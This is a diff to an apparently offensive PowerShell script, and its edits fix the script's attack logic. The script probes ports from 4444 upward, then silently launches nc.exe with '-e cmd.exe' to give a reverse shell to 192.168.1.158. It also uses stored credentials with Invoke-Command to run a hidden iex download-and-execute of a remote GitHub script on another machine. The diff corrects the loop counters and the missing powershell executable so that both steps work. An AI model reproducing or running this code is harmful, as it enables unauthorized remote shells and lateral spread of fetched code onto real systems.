@@ -10,8 +10,6 @@ $p = 4444
 while ($b -lt 4) {
 
 $an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSucceeded
-$p++
-$b++
 
 if ($an -eq $true){
 
@@ -19,6 +17,9 @@ Start-Sleep -Seconds 20
 Start-Process -WindowStyle Hidden powershell.exe "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"
 
 }
+$p++
+$b++
+
 
 }
 
@@ -64,7 +65,7 @@ $islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotia
 if ($islive -ne $null){
 
 
-Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock { Start-Process -WindowStyle Hidden "-nop iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')" }
+Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock { Start-Process -WindowStyle Hidden powershell "-nop iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')" }
 
 
 }
